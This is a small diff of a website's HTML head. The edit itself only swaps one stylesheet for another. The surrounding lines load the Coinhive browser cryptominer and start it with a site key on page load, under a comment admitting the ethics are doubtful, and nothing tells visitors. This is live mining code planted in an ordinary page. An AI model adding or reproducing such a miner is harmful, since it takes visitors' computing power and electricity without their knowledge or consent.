@@ -44,7 +44,7 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
     <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-    <link rel="stylesheet" href="css/home.css">
+    <link rel="stylesheet" href="css/pages.css">
     <script>
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
 	      miner.start();
